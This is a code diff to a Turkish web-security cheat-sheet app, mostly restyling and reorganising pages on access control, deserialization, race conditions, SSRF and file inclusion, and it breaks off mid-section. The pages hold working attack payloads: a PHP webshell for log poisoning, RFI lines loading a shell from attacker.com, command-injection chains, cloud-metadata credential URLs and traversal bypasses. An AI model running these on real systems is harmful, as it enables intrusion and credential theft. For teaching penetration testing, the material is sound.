@@ -488,6 +488,9 @@
       content: "";
     }
 
+    .content {
+      transition: zoom 0.3s ease;
+    }
     .hidden {
       display: none !important;
     }
@@ -3906,12 +3909,12 @@ Content-Type: application/json
         ]
       },
 
-      idor: {
-        menuName: 'IDOR',
+      bac: {
+        menuName: 'BAC',
         icon: 'icon-idor-search',
         parent: 'vulnerabilities',
-        title: 'IDOR - Insecure Direct Object Reference',
-        description: 'IDOR test metodolojisi ve yetki kontrolü atlatma senaryoları.',
+        title: 'BAC - Broken Access Control',
+        description: 'Sunucu tarafında yeterli yetkilendirme/erişim kontrolü yapılmaması sonucu yetkisiz erişim veya işlem yapılabilmesine sebep olan güvenlik açığı sınıfı.',
         sections: [
           {
             title: 'Metodoloji',
@@ -4194,95 +4197,6 @@ Content-Type: application/json
                 
             </ul>`
           },
-        ]
-      },
-      
-      bac: {
-        menuName: 'BAC',
-        icon: 'icon-lock-broken',
-        parent: 'vulnerabilities',
-        title: 'BAC - Broken Access Control',
-        description: 'Sunucu tarafında yeterli yetkilendirme/erişim kontrolü yapılmaması sonucu yetkisiz erişim veya işlem yapılabilmesine sebep olan güvenlik açığı sınıfı.',
-        sections: [
-          {
-            title: 'Metodoloji',
-            content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-              Kimin hangi kaynağa veya işleve erişebileceğini belirleyen sunucu tarafı kontrollerinin eksik veya hatalı uygulanması. 
-              Client-side sadece görünürlük engellemeleri güvenlik sağlamaz - tüm hassas kontroller sunucuda olmalıdır.
-            </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-              HTTP metodu, parametre veya header değişikliği ile yetki atlatma denenebilir → GET, POST, PUT, DELETE vb. 
-              Ayrıca role/owner kontrollerinin nesne seviyesinde (object-level) doğrulandığından emin olun.
-            </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-              Örnek akış: kullanıcı hesabı ile giriş yapılır → belirli bir kaynağa erişim istenir → sunucu owner/role kontrolü yapıyor mu gözlemlenir.
-            </li>
-          </ul>
-        `
-          },
-          {
-            title: 'Örnekler',
-            content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-              Admin-only endpoint'ine normal kullanıcı token'ı ile istek gönderildiğinde işlem gerçekleşiyor (sunucu role check yapmıyor).
-            </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-              /invoices/1000/download gibi doğrudan dosya path'leri kimlik doğrulama veya owner kontrolü olmadan sunuluyor.
-            </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-              UI'da gizlenen admin butonu client-side ile etkinleştirilebiliyor ve sunucu bunu kontrol etmiyor.
-            </li>
-          </ul>
-        `
-          },
-          {
-            title: 'Nerede Bulunur?',
-            content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">URL / Path / Query parametrelerinde → /orders/{id}, ?user_id=</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">AJAX / API endpointlerinde → /api/v1/admin/*, /api/v1/invoices/*</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Dosya depolama / doğrudan erişim yollarında → /uploads/... veya S3 benzeri path'lerde</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Client-side feature flags veya role parametrelerinde → is_admin, debug, role gibi parametreler</li>
-          </ul>
-        `
-          },
-          {
-            title: 'Test Adımları',
-            content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-              Keşfet: Proxy ve tarayıcı devtools ile tüm endpoint'leri ve istekleri topla.
-            </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-              Roller/hesaplar: En az iki hesap oluştur (normal user + ikinci user). Mümkünse ayrı privilege rollerini de test et.
-            </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-              Parametre, metod ve header manipülasyonu: ID, owner, role parametrelerini değiştir; GET↔POST gibi metod değişiklikleri dene.
-            </li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-              Nesne seviyesinde doğrulama: Her obje isteğinde server-side owner/role kontrolü yapılıyor mu kontrol et.
-            </li>
-          </ul>
-        `
-          },
-          {
-            title: "Metot Manipülasyonu (Örnek Senaryo)",
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-        <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-            <strong>Senaryo:</strong> Kritik bir silme işlemi sadece POST ile yapılmaya izin verirken, DELETE metodunu kontrol etmiyor.
-            <pre>
-// Başarısız İstek (Yetki Hatası)
-GET /admin/delete?user=1 (403 Forbidden)
-
-// Başarılı PoC (Metot Atlatma)
-DELETE /admin/delete?user=1</pre>
-            <div class="small">Sunucu tarafı yetki kontrolü (auth/role check) eksikse, metod değişikliği ile kısıtlama atlanır.</div>
-        </li>
-    </ul>`
-          }
         ]
       },
 
@@ -7234,10 +7148,10 @@ XmlReader reader = XmlReader.Create(stream, settings);</pre>
 
       insecure_deserialization: {
         menuName: 'Insecure Deserialization',
-        icon: 'icon-bomb',
+        icon: 'icon-ghost',
         parent: 'vulnerabilities',
         title: 'Insecure Deserialization (Güvensiz Serileştirme)',
-        description: 'Kullanıcı kontrolündeki serileştirilmiş verilerin doğrulanmadan nesneye dönüştürülmesi sonucu ortaya çıkan kritik zafiyet. PHP Object Injection, Java Gadget Chains (ysoserial) ve Python Pickle RCE mekanizmaları.',
+        description: 'Kullanıcı kontrolündeki serileştirilmiş verilerin doğrulanmadan nesneye dönüştürülmesi sonucu ortaya çıkan kritik zafiyet.<br>PHP Object Injection, Java Gadget Chains (ysoserial) ve Python Pickle RCE mekanizmaları.',
         sections: [
           {
             title: '1. Serialization ve Deserialization Temelleri',
@@ -7273,12 +7187,12 @@ XmlReader reader = XmlReader.Create(stream, settings);</pre>
                   <strong style="color:var(--accent); display:block; margin-bottom:4px;">🔑 Privilege Escalation (Yetki Yükseltme)</strong>
                   <p class="small" style="margin:0;">Cookie veya oturumda tutulan serileştirilmiş nesnenin <code>role</code>, <code>isAdmin</code> veya <code>access_level</code> alanları değiştirilerek dikey yetki artışı sağlanır.</p>
                 </div>
-                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid var(--secondary);">
-                  <strong style="color:var(--secondary); display:block; margin-bottom:4px;">📝 Data Tampering (Veri Manipülasyonu)</strong>
+                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid var(--accent);">
+                  <strong style="color:var(--accent); display:block; margin-bottom:4px;">📝 Data Tampering (Veri Manipülasyonu)</strong>
                   <p class="small" style="margin:0;">Bakiye kontrolü, dosya indirme yolları veya kullanıcı ID değerleri doğrulanmayan nesne özellikleri üzerinden ezilir.</p>
                 </div>
-                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid #facc15;">
-                  <strong style="color:#facc15; display:block; margin-bottom:4px;">🛑 Denial of Service (DoS)</strong>
+                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid #ef4444;">
+                  <strong style="color:#ef4444; display:block; margin-bottom:4px;">🛑 Denial of Service (DoS)</strong>
                   <p class="small" style="margin:0;">Aşırı karmaşık, iç içe geçmiş veya bellek tüketen sahte nesneler gönderilerek sunucunun CPU/RAM kaynakları kilitlenir.</p>
                 </div>
               </div>
@@ -7331,8 +7245,8 @@ POST /api/worker_task (serialized job)</pre>
                     <tr style="border-bottom:1px solid var(--glass);">
                       <th style="text-align:left;padding:8px;color:#cbd5e1;">Teknoloji / Dil</th>
                       <th style="text-align:left;padding:8px;color:var(--accent);">Ham Veri (Hex / Metin)</th>
-                      <th style="text-align:left;padding:8px;color:var(--secondary);">Base64 Başlangıcı</th>
-                      <th style="text-align:left;padding:8px;color:#facc15;">Format Özelliği</th>
+                      <th style="text-align:left;padding:8px;color:var(--accent);">Base64 Başlangıcı</th>
+                      <th style="text-align:left;padding:8px;color:var(--accent);">Format Özelliği</th>
                     </tr>
                   </thead>
                   <tbody>
@@ -7403,7 +7317,7 @@ POST /api/worker_task (serialized job)</pre>
                     <tr style="border-bottom:1px solid var(--glass);">
                       <th style="text-align:left;padding:8px;color:#cbd5e1;">Tip Kodu</th>
                       <th style="text-align:left;padding:8px;color:var(--accent);">Temsil Ettiği Veri</th>
-                      <th style="text-align:left;padding:8px;color:var(--secondary);">Örnek Sözdizimi</th>
+                      <th style="text-align:left;padding:8px;color:var(--accent);">Örnek Sözdizimi</th>
                     </tr>
                   </thead>
                   <tbody>
@@ -7655,11 +7569,11 @@ GET /temp/shell.php (silinmeden çalıştır!)</pre>
                   <p class="small" style="margin-bottom:4px;">Hedef işlemi (örn. kupon uygulama isteği) yakala, Burp Repeater'a gönder. İsteği 10-20 defa kopyalayarak ayrı sekmeler aç ve hepsini bir <b>Tab Group</b> içine al.</p>
                 </li>
                 <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
-                  <strong style="color:var(--secondary);display:block;margin-bottom:6px;">ADIM 2: "Send group in parallel (single-packet attack)" Seç</strong>
+                  <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 2: "Send group in parallel (single-packet attack)" Seç</strong>
                   <p class="small" style="margin-bottom:4px;">Burp Repeater'da gönderim modunu <b>"Send group in parallel"</b> yap. HTTP/2 desteği varsa Burp tüm isteklerin son baytlarını tek bir TCP paketinde sıkıştırır. 20-30 istek sunucu çekirdeklerine <b>aynı mikrosaniyede</b> çarpar.</p>
                 </li>
                 <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
-                  <strong style="color:#facc15;display:block;margin-bottom:6px;">ADIM 3: Turbo Intruder ile Test (Büyük Ölçekli Otomasyon)</strong>
+                  <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 3: Turbo Intruder ile Test (Büyük Ölçekli Otomasyon)</strong>
                   <p class="small" style="margin-bottom:4px;">Daha geniş pencereler veya HTTP/1.1 hedefler için Turbo Intruder eklentisini açıp 'race.py' şablonunu kullan:</p>
                   <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:4px 0 0 0;font-family:monospace;font-size:11px;color:#00ff88;">def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint, concurrentConnection=30, requestsPerConnection=100, pipeline=False)
@@ -7668,7 +7582,7 @@ GET /temp/shell.php (silinmeden çalıştır!)</pre>
     engine.openGate('race1') # Tüm istekler kapı açıldığı an aynı anda fırlar</pre>
                 </li>
                 <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
-                  <strong style="color:#4ade80;display:block;margin-bottom:6px;">ADIM 4: Yanıtları Karşılaştır</strong>
+                  <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 4: Yanıtları Karşılaştır</strong>
                   <p class="small" style="margin-bottom:4px;">Dönen status kodlarına ve response body uzunluklarına bak. Normalde 1 adet 200 OK ve 19 adet 400 Bad Request beklenirken, 2 veya daha fazla 200 OK dönmüşse yarış durumu yakalanmıştır.</p>
                 </li>
               </ul>
@@ -7686,11 +7600,11 @@ GET /temp/shell.php (silinmeden çalıştır!)</pre>
                   <strong style="color:var(--accent); display:block; margin-bottom:4px;">🛡️ Güvenlik Kontrollerini ve Rate Limit'i Baypas</strong>
                   <p class="small" style="margin:0;">Sayaç veritabanına yazılmadan önce 50 paralel istek araya girer; 5 deneme hakkı olan OTP ekranında yüzlerce şifre denenir.</p>
                 </div>
-                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid var(--secondary);">
+                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid var(--accent);">
                   <strong style="color:var(--accent); display:block; margin-bottom:4px;">💥 Uzaktan Kod Çalıştırma (File Upload TOCTOU)</strong>
                   <p class="small" style="margin:0;">Yüklenen zararlı webshell sunucu doğrulaması veya AV tarafından silinmeden önceki 200 milisaniyede çalıştırılarak kalıcı shell alınır.</p>
                 </div>
-                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid #facc15;">
+                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid #ef4444;">
                   <strong style="color:#ef4444; display:block; margin-bottom:4px;">👥 Çoklu Hesap Eşleme & Yetki Yükseltme</strong>
                   <p class="small" style="margin:0;">Aynı davet koduyla aynı anda sisteme kayıt olarak tekil olması gereken kaynakları veya yönetici davet linkini birden fazla hesaba bağlama.</p>
                 </div>
@@ -7702,7 +7616,7 @@ GET /temp/shell.php (silinmeden çalıştır!)</pre>
             content: `
               <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
                 <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
-                  <strong style="color:#cbd5e1;display:block;margin-bottom:6px;">Senaryo 1: Tek Kullanımlık Kupon ile Sepet Sıfırlama</strong>
+                  <strong style="color:var(--accent);display:block;margin-bottom:6px;">Senaryo 1: Tek Kullanımlık Kupon ile Sepet Sıfırlama</strong>
                   <p class="small" style="margin-bottom:6px;">Hedef: <code>SIGNUP20</code> (20$ tek seferlik indirim kuponu). Sepet tutarı: 100$.</p>
                   <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;font-size:12px;color:#d6f4ff;white-space:pre-wrap;">// Paralel gönderilen 10 eşzamanlı istek:
 POST /cart/coupon/apply HTTP/2
@@ -7731,7 +7645,7 @@ GET /uploads/temp/exploit.php HTTP/1.1
 # Sonuç: exploit.php silinmeden aradaki 50ms'de tetiklenir ve kalıcı "shell.php" dosyasını yazar!</pre>
                 </li>
                 <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
-                  <strong style="color:#ef4444;display:block;margin-bottom:6px;">Senaryo 3: E-posta Doğrulama Baypası (Multi-Email Collision)</strong>
+                  <strong style="color:var(--accent);display:block;margin-bottom:6px;">Senaryo 3: E-posta Doğrulama Bypass (Multi-Email Collision)</strong>
                   <p class="small" style="margin-bottom:6px;">Kullanıcı e-posta değiştirirken doğrulama kodu gönderiliyor. Saldırgan aynı anda iki farklı e-posta değiştirme isteği yollar:</p>
                   <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;font-size:12px;color:#d6f4ff;white-space:pre-wrap;">İstek A: POST /user/email/change &rarr; {"email": "saldirgan@evil.com"}
 İstek B: POST /user/email/change &rarr; {"email": "admin@target.com"}
@@ -7896,7 +7810,7 @@ http://127.0.0.1:8080       --> Tomcat / Jenkins yönetim panelleri
 http://127.0.0.1:6379       --> Parolasız Redis (Gopher ile RCE'ye gidebilir)</pre>
                 </li>
                 <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
-                  <strong style="color:var(--secondary);display:block;margin-bottom:6px;">2. Yerel Dosya Okuma (LFI Pivot)</strong>
+                  <strong style="color:var(--accent);display:block;margin-bottom:6px;">2. Yerel Dosya Okuma (LFI Pivot)</strong>
                   <p class="small" style="margin-bottom:6px;">Sunucudaki HTTP istemcisi şemayı doğrulamıyorsa doğrudan dosya sistemini oku:</p>
                   <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">file:///etc/passwd
 file:///etc/hosts
@@ -7904,7 +7818,7 @@ file:///c:/windows/win.ini
 file:///proc/net/arp        --> Sunucunun konuştuğu diğer iç ağ IP'lerini listeler</pre>
                 </li>
                 <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
-                  <strong style="color:#ef4444;display:block;margin-bottom:6px;">3. Komut Enjeksiyonu Denemeleri (Command Injection Zinciri)</strong>
+                  <strong style="color:var(--accent);display:block;margin-bottom:6px;">3. Komut Enjeksiyonu Denemeleri (Command Injection Zinciri)</strong>
                   <p class="small" style="margin-bottom:6px;">Arka planda <code>curl</code>, <code>wget</code> veya <code>ffmpeg</code> doğrudan bash/sh içine basılıyorsa kabuk operatörleriyle zincirle:</p>
                   <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">; ls
 & ls
@@ -7915,7 +7829,7 @@ http://127.0.0.1;ls
 http://example.com/test.jpg;id</pre>
                 </li>
                 <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
-                  <strong style="color:#facc15;display:block;margin-bottom:6px;">4. Bulut Metadata Çekme (Cloud IAM Takeover)</strong>
+                  <strong style="color:var(--accent);display:block;margin-bottom:6px;">4. Bulut Metadata Çekme (Cloud IAM Takeover)</strong>
                   <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">AWS (IMDSv1): http://169.254.169.254/latest/meta-data/iam/security-credentials/
 Google Cloud: http://metadata.google.internal/computeMetadata/v1/
 Azure:        http://169.254.169.254/metadata/instance?api-version=2021-02-01
@@ -7934,7 +7848,7 @@ DigitalOcean: http://169.254.169.254/metadata/v1.json</pre>
                     <tr style="border-bottom:1px solid var(--glass);">
                       <th style="text-align:left;padding:8px;color:#cbd5e1;">Teknik</th>
                       <th style="text-align:left;padding:8px;color:var(--accent);">Payload</th>
-                      <th style="text-align:left;padding:8px;color:var(--secondary);">Neden Çalışır?</th>
+                      <th style="text-align:left;padding:8px;color:var(--accent);">Neden Çalışır?</th>
                     </tr>
                   </thead>
                   <tbody>
@@ -8306,100 +8220,212 @@ DigitalOcean: http://169.254.169.254/metadata/v1.json</pre>
           }
         ]
       },
-      file_inclusion: {
+file_inclusion: {
         menuName: 'File Inclusion',
         icon: 'icon-folder-open',
         parent: 'vulnerabilities',
-        title: 'File Inclusion - LFI / RFI / Path Traversal',
-        description: 'LFI (Yerel Dosya Dahil Etme) ve RFI (Uzak Dosya Dahil Etme) zafiyetleri için PoC, bypass teknikleri ve kritik dosya yolları.',
+        title: 'File Inclusion (LFI / RFI) ve Path Traversal',
+        description: 'Sunucu tarafında dosya yollarının ve dinamik dahil etme fonksiyonlarının denetlenmemesi sonucu ortaya çıkan erişim ve kod yürütme zafiyetleri.',
         sections: [
           {
-            title: 'Temel Mantık',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Uygulama, <code>file</code> gibi bir parametreyi sunucu tarafında dosya dahil etmek (include/require) veya okumak için kullanıyorsa, kontrolsüz girdi LFI/RFI zafiyetine yol açar.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><b>LFI:</b> Sunucudaki yerel dosyalar okunur. <br><b>RFI:</b> Uzaktaki bir sunucudan dosya çağrılır (PHP ise Uzaktan Kod Çalıştırma (RCE) riski taşır). <br><b>Path Traversal:</b> <code>../</code> karakterleri ile dizin dışına çıkılır.</li>
-            </ul>`
+            title: '1. Temel Mantık: Path Traversal vs. LFI',
+            content: `
+              <p style="color:var(--muted);font-size:14px;margin-bottom:12px;">
+                Uygulama, <code>file</code> gibi bir parametreyi sunucu tarafında dosya okumak veya dahil etmek (include/require) için kullanıyorsa kontrolsüz girdi bu iki farklı zafiyete yol açar:
+              </p>
+              <div class="tool-io-grid">
+                <div class="card" style="margin-bottom:0; border: 1px solid var(--border);">
+                  <h4 style="font-size:13px; color:#cbd5e1;">Path Traversal (Dizin Gezinimi)</h4>
+                  <p class="small" style="margin:0 0 6px 0;">
+                    Uygulama parametreyi doğrudan dosya sistemi okuma fonksiyonlarına iletir. <code>../</code> karakterleri ile web kök dizini (web root) dışına çıkılır.
+                  </p>
+                  <p class="small" style="margin:0; color:var(--muted);">
+                    <b>Sonuç:</b> Hedef dosya sunucu tarafından <b>çalıştırılmaz</b>; yalnızca düz metin olarak <b>okunur veya indirilir</b> (Kaynak kodlar, konfigürasyon dosyaları, sistem listeleri).
+                  </p>
+                </div>
+                <div class="card" style="margin-bottom:0; border: 1px solid var(--border);">
+                  <h4 style="font-size:13px; color:#cbd5e1;">Local File Inclusion (LFI)</h4>
+                  <p class="small" style="margin:0 0 6px 0;">
+                    Uygulama hedef dosyayı yalnızca okumakla kalmaz; programlama dili çalışma zamanına dahil ederek <b>kod olarak derler ve çalıştırır</b>.
+                  </p>
+                  <p class="small" style="margin:0; color:var(--muted);">
+                    <b>Sonuç:</b> Hedef dosyanın uzantısı ne olursa olsun (<code>.txt</code>, <code>.log</code>, <code>.jpg</code>) içindeki script blokları sunucuda yürütülür ve <b>Uzaktan Kod Çalıştırma (RCE)</b> sağlar.
+                  </p>
+                </div>
+              </div>
+            `
           },
           {
-            title: 'LFI - Hızlı Tespit',
+            title: '2. LFI - Hızlı Tespit & PoC Akışı',
             content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tespit: <code>?file=userCV.pdf</code> → <code>?file=../../../../etc/passwd</code> dene.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">PoC örnek: <code>GET /get.php?file=../../../../etc/passwd</code> → /etc/passwd satırları dönüyorsa LFI.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Log poisoning: Webserver access/error loglarına payload yazıp <code>?file=/var/log/apache2/access.log</code> ile RCE'ye çevirmeyi dene (ör. &lt;?php system($_GET['cmd']); ?&gt; payload).</li>
-          </ul>
-        `
+              <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Hızlı Tespit:</strong> <code>?file=userCV.pdf</code> &rarr; <code>?file=../../../../etc/passwd</code> şeklinde üst dizinlere çıkarak dene.
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>PoC İstek:</strong> <code>GET /get.php?file=../../../../etc/passwd</code> &rarr; <code>root:x:0:0...</code> satırları dönüyorsa LFI/Traversal doğrulanmıştır.
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Log Poisoning ile RCE:</strong> Web sunucusu erişim/hata loglarına payload yazıp LFI ile include ederek kod çalıştır:
+                  <div class="small" style="margin-top:6px; color:#d6f4ff;">
+                    1) User-Agent başlığına veya URL'e zararlı PHP enjekte et: <code>&lt;?php system($_GET['cmd']); ?&gt;</code><br>
+                    2) LFI parametresiyle log dosyasını çağır: <code>?file=/var/log/apache2/access.log&cmd=id</code>
+                  </div>
+                </li>
+              </ul>
+            `
           },
           {
-            title: 'RFI - Hızlı Tespit',
+            title: '3. RFI - Hızlı Tespit & Koşullar',
             content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tespit: <code>?file=http://attacker.com/shell.txt</code> koy → sunucu uzaktaki dosyayı include edip çalıştırıyor mu?</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Gereksinim: PHP için <code>allow_url_include=On</code> veya benzeri wrapper'ların aktif olması gerekir; yoksa RFI olmaz.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">PoC: attacker hostunda basit PHP shell barındır, <code>?file=http://attackbox:8000/shell.txt</code> ile dene.</li>
-          </ul>
-        `
+              <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Tespit:</strong> <code>?file=http://attacker.com/shell.txt</code> &rarr; Sunucu uzaktaki dosyayı include edip çalıştırıyor mu kontrol et.
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Gereksinim:</strong> PHP için <code>allow_url_include = On</code> yapılandırmasının açık olması gerekir (Modern sürümlerde varsayılan kapalıdır; kapalıysa RFI çalışmaz, LFI denenmelidir).
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>PoC:</strong> Kendi sunucunda basit bir text dosyası barındır (örn: <code>&lt;?php phpinfo(); ?&gt;</code>) ve çağır: <code>?file=http://10.10.145.212:8000/cmd.txt</code>
+                </li>
+              </ul>
+            `
           },
           {
-            title: 'Path Traversal & Bypass Teknikleri',
+            title: '4. Path Traversal & Bypass Teknikleri',
             content: `
-<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-    <b>Basit:</b> <code>../../../../etc/passwd</code> veya <code>/etc/passwd</code>
-  </li>
-  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-    <b>Encoding:</b> <code>..%2f..%2f..%2fetc/passwd</code> veya double-encode: <code>..%252f..%252f..%252fetc/passwd</code>
-  </li>
-  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-    <b>Null byte (eski PHP sürümlerinde):</b> <code>../../../../etc/passwd%00</code>
-  </li>
-  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-    <b>Weird forms:</b> <code>....//....//etc/passwd</code>, octal/decimal IP trickleri vb.
-  </li>
+              <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Basit Traversal:</strong> <code>../../../../etc/passwd</code> veya doğrudan kök dizin: <code>/etc/passwd</code>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Encoding:</strong> <code>..%2f..%2f..%2fetc/passwd</code> veya double-encode: <code>..%252f..%252f..%252fetc/passwd</code>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Filtre Silme Baypası (Non-recursive strip):</strong> <code>....//....//etc/passwd</code> (Sunucu <code>../</code> sildiğinde aradaki karakterler tekrar <code>../</code> oluşturur).
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Null Byte (Eski PHP sürümlerinde):</strong> <code>../../../../etc/passwd%00</code>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Null Byte + Uzantı Filtresi Bypass:</strong> <code>/image?filename=../../../../etc/passwd%00.jpg</code>
+                  <ul style="padding-left: 20px; margin-top: 8px; font-size: 13px; color:var(--muted);">
+                    <li><b>.jpg kısmı:</b> Uygulama "sadece .jpg dosyalarını aç" filtresi uyguluyorsa, sona <code>.jpg</code> eklenerek kontrol atlatılır.</li>
+                    <li><b>%00 (Null Byte) kısmı:</b> Dize sonu (string terminator) karakteridir. Sunucu dosya sistemine giderken <code>%00</code>'ı gördüğü yerde okumayı bitirir; <code>.jpg</code> kısmı yok sayılır ve <code>/etc/passwd</code> okunur.</li>
+                  </ul>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Path Truncation:</strong> <code>../../etc/passwd/./././...</code> (4096 baytı aşan yollarda dosya sistemi yolu keserek uzantıyı göz ardı eder).
+                </li>
+              </ul>
+            `
+          },
+          {
+            title: '5. Önemli PHP Wrapper & Sömürü Teknikleri',
+            content: `
+              <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Kaynak Kod Okuma (php://filter):</strong> PHP dosyaları normal include edildiğinde çalıştırılır, kodları görünmez. Base64 formatında okumak için:
+                  <pre style="margin-top:6px; background:rgba(0,0,0,0.3); padding:8px; border-radius:6px; color:#d6f4ff;">php://filter/convert.base64-encode/resource=index.php</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Doğrudan Kod Yürütme (data:// ve php://input):</strong> <code>allow_url_include</code> açıksa harici dosya gerekmeden POST gövdesinden kod çalıştırma:
